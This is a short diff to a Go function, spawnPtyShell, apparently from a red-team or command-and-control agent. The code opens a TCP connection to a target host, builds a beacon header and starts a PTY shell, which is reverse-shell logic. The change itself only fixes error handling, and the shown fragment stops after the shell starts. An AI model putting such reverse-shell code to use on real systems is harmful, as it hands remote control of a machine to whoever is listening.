@@ -9,13 +9,12 @@ import (
 	"io"
 	"net"
 	"os/exec"
-	"strings"
 )
 
 func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
-	conn, _ := net.Dial("tcp", strings.Trim(target, "\""))
-	header, err := agent.BuildSocketBeacon("pty")
-	if err == nil {
+	conn, err := net.Dial("tcp", target)
+	header, errBeacon := agent.BuildSocketBeacon("pty")
+	if err == nil && errBeacon == nil {
 		ctx, cancel := context.WithCancel(context.Background())
 		ptyShell := exec.CommandContext(ctx, executor)
 		ptmx, _ := shell.Start(ptyShell)
